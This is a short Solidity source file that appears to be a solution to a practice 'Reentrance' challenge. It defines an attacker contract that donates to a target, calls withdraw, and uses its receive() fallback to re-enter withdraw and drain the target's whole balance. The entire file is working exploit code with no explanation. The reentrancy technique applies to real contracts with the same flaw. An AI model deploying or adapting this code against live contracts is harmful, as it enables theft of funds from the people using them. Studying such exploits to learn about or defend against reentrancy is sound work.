// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceSol {
    uint256 public reentranceCnt;
    IReentrance public instance;

    constructor(address instance_) public payable {
        instance = IReentrance(instance_);
    }

    function attack() public payable {
        instance.donate{value: msg.value}(address(this));
        instance.withdraw(msg.value);
        instance.withdraw(address(instance).balance);
    }

    receive() external payable {
        reentranceCnt++;
        if (reentranceCnt < 2) {
            instance.withdraw(1);
        }
    }
}
